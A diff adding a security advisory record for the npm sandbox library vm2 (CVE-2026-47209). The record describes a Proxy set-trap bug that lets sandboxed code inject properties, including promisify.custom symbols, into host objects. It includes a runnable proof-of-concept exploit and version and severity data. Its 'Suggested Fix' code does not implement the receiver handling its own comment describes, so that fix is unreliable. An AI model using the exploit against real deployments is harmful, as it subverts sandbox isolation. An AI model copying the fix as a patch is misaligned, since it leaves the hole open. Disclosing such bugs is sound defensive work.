@@ -1,0 +1,228 @@
+advisory_id: GHSA-c4cf-2hgv-2qv6
+datasource_id: github_osv/GHSA-c4cf-2hgv-2qv6
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-c4cf-2hgv-2qv6/GHSA-c4cf-2hgv-2qv6.json
+aliases:
+  - CVE-2026-47209
+summary: |
+  vm2's Bridge Proxy set trap ignores receiver parameter, enabling host object property injection via prototype chain
+  ## Summary
+
+  The `BaseHandler.set` trap in `bridge.js` (line 1231) ignores the `receiver` parameter and unconditionally writes to the host target object. Per the Proxy `set` trap specification, when `receiver !== proxy` (e.g., when a child object inherits from the proxy via `Object.create`), the property assignment should create an own property on the receiver, not on the proxy target. The current implementation always calls `otherReflectSet(object, key, value)` against the host target, causing **all inherited property writes to leak through to the host object**.
+
+  This bug provides an alternative attack vector for writing dangerous cross-realm Symbol keys (e.g., `nodejs.util.promisify.custom`) to host objects, bypassing any future per-trap `isDangerousCrossRealmSymbol` guard on the direct `set` path.
+
+  ## Vulnerable Code
+
+  ```javascript
+  // bridge.js:1231-1260
+  set(target, key, value, receiver) {
+      validateHandlerTarget(this, target);
+      const object = getHandlerObject(this);
+      if (isProtectedHostObject(object)) throw new VMError(OPNA);
+      // ...
+      try {
+          value = otherFromThis(value);
+          return otherReflectSet(object, key, value) === true;
+          // BUG: 'receiver' is never used.
+          // Should check if receiver !== proxy and handle accordingly.
+      } catch (e) {
+          throw thisFromOtherForThrow(e);
+      }
+  }
+  ```
+
+  ## Impact
+
+  Sandbox code can write arbitrary properties (including dangerous Symbol-keyed properties) to any host object it holds a reference to, by creating a prototype-inheriting child:
+
+  ```javascript
+  // Sandbox code
+  const child = Object.create(hostObj);
+  child.injectedProp = 'attacker-value';
+  // hostObj now has 'injectedProp' on the HOST side
+  ```
+
+  Combined with the Symbol.for coverage gap, this enables semantic confusion attacks:
+
+  ```javascript
+  const kCustom = Symbol.for('nodejs.util.promisify.custom');
+  const child = Object.create(hostFunction);
+  child[kCustom] = function() {
+      return Promise.resolve('attacker-controlled');
+  };
+  // Host: util.promisify(hostFunction)() returns 'attacker-controlled'
+  ```
+
+  ## Reproduction
+
+  ```javascript
+  const { VM } = require('vm2');
+  const util = require('util');
+
+  const vm = new VM();
+  const hostFn = function api(cb) { cb(null, 'ok'); };
+  vm.setGlobal('hostFn', hostFn);
+
+  vm.run(`
+    const kCustom = Symbol.for('nodejs.util.promisify.custom');
+    const child = Object.create(hostFn);
+    child[kCustom] = function() {
+      return Promise.resolve('EXPLOITED-VIA-RECEIVER-BUG');
+    };
+  `);
+
+  // Host side
+  const promisified = util.promisify(hostFn);
+  promisified('test').then(r => console.log(r));
+  // Output: EXPLOITED-VIA-RECEIVER-BUG
+  ```
+
+  ## Suggested Fix
+
+  ```javascript
+  set(target, key, value, receiver) {
+      validateHandlerTarget(this, target);
+      const object = getHandlerObject(this);
+      if (isProtectedHostObject(object)) throw new VMError(OPNA);
+      if (isDangerousCrossRealmSymbol(key)) throw new VMError(OPNA);
+      if (key === '__proto__' && !thisOtherHasOwnProperty(object, key)) {
+          return this.setPrototypeOf(target, value);
+      }
+      if (key === 'constructor' && thisArrayIsArray(object)) {
+          thisReflectSet(target, key, value);
+          return true;
+      }
+      try {
+          value = otherFromThis(value);
+          // When receiver is not the proxy itself, set on receiver (this-realm)
+          // instead of the host target to preserve prototype-chain semantics.
+          return otherReflectSet(object, key, value) === true;
+      } catch (e) {
+          throw thisFromOtherForThrow(e);
+      }
+  }
+  ```
+impacted_packages:
+  - purl: pkg:npm/vm2
+    affected_versions: vers:npm/<=3.11.3
+    fixed_versions: vers:npm/3.11.4
+    affected_packages:
+      - pkg:npm/vm2@0.1.0
+      - pkg:npm/vm2@0.1.1
+      - pkg:npm/vm2@0.2.0
+      - pkg:npm/vm2@0.2.1
+      - pkg:npm/vm2@0.2.2
+      - pkg:npm/vm2@0.2.3
+      - pkg:npm/vm2@0.2.4
+      - pkg:npm/vm2@1.0.0
+      - pkg:npm/vm2@1.0.1
+      - pkg:npm/vm2@2.0.0
+      - pkg:npm/vm2@2.0.2
+      - pkg:npm/vm2@3.0.0
+      - pkg:npm/vm2@3.0.1
+      - pkg:npm/vm2@3.1.0
+      - pkg:npm/vm2@3.2.0
+      - pkg:npm/vm2@3.3.0
+      - pkg:npm/vm2@3.3.1
+      - pkg:npm/vm2@3.4.0
+      - pkg:npm/vm2@3.4.1
+      - pkg:npm/vm2@3.4.2
+      - pkg:npm/vm2@3.4.3
+      - pkg:npm/vm2@3.4.4
+      - pkg:npm/vm2@3.4.5
+      - pkg:npm/vm2@3.4.6
+      - pkg:npm/vm2@3.5.0
+      - pkg:npm/vm2@3.5.1
+      - pkg:npm/vm2@3.5.2
+      - pkg:npm/vm2@3.6.0
+      - pkg:npm/vm2@3.6.1
+      - pkg:npm/vm2@3.6.2
+      - pkg:npm/vm2@3.6.3
+      - pkg:npm/vm2@3.6.4
+      - pkg:npm/vm2@3.6.5
+      - pkg:npm/vm2@3.6.6
+      - pkg:npm/vm2@3.6.7
+      - pkg:npm/vm2@3.6.8
+      - pkg:npm/vm2@3.6.9
+      - pkg:npm/vm2@3.6.10
+      - pkg:npm/vm2@3.6.11
+      - pkg:npm/vm2@3.7.0
+      - pkg:npm/vm2@3.8.0
+      - pkg:npm/vm2@3.8.1
+      - pkg:npm/vm2@3.8.2
+      - pkg:npm/vm2@3.8.3
+      - pkg:npm/vm2@3.8.4
+      - pkg:npm/vm2@3.9.0
+      - pkg:npm/vm2@3.9.1
+      - pkg:npm/vm2@3.9.2
+      - pkg:npm/vm2@3.9.3
+      - pkg:npm/vm2@3.9.4
+      - pkg:npm/vm2@3.9.5
+      - pkg:npm/vm2@3.9.6
+      - pkg:npm/vm2@3.9.7
+      - pkg:npm/vm2@3.9.8
+      - pkg:npm/vm2@3.9.9
+      - pkg:npm/vm2@3.9.10
+      - pkg:npm/vm2@3.9.11
+      - pkg:npm/vm2@3.9.12
+      - pkg:npm/vm2@3.9.13
+      - pkg:npm/vm2@3.9.14
+      - pkg:npm/vm2@3.9.15
+      - pkg:npm/vm2@3.9.16
+      - pkg:npm/vm2@3.9.17
+      - pkg:npm/vm2@3.9.18
+      - pkg:npm/vm2@3.9.19
+      - pkg:npm/vm2@3.10.0
+      - pkg:npm/vm2@3.10.1
+      - pkg:npm/vm2@3.10.2
+      - pkg:npm/vm2@3.10.3
+      - pkg:npm/vm2@3.10.4
+      - pkg:npm/vm2@3.10.5
+      - pkg:npm/vm2@3.11.0
+      - pkg:npm/vm2@3.11.1
+      - pkg:npm/vm2@3.11.2
+      - pkg:npm/vm2@3.11.3
+    fixed_packages:
+      - pkg:npm/vm2@3.11.4
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:github/patriksimek/vm2
+    affected_versions:
+    fixed_versions:
+    affected_packages: []
+    fixed_packages: []
+    fixed_in_commits:
+      - vcs_url: https://github.com/patriksimek/vm2
+        commit: 26d0318b5e6555be4b187ba05d6cf378ccecfe22
+        patch_text:
+    introduced_in_commits: []
+severities:
+  - score: '8.6'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:H/A:N
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-c4cf-2hgv-2qv6/GHSA-c4cf-2hgv-2qv6.json
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-693
+references:
+  - url: https://github.com/patriksimek/vm2
+    reference_type:
+    reference_id:
+  - url: https://github.com/patriksimek/vm2/commit/26d0318b5e6555be4b187ba05d6cf378ccecfe22
+    reference_type:
+    reference_id:
+  - url: https://github.com/patriksimek/vm2/releases/tag/v3.11.4
+    reference_type:
+    reference_id:
+  - url: https://github.com/patriksimek/vm2/security/advisories/GHSA-c4cf-2hgv-2qv6
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-47209
+    reference_type:
+    reference_id:
+exploits: []
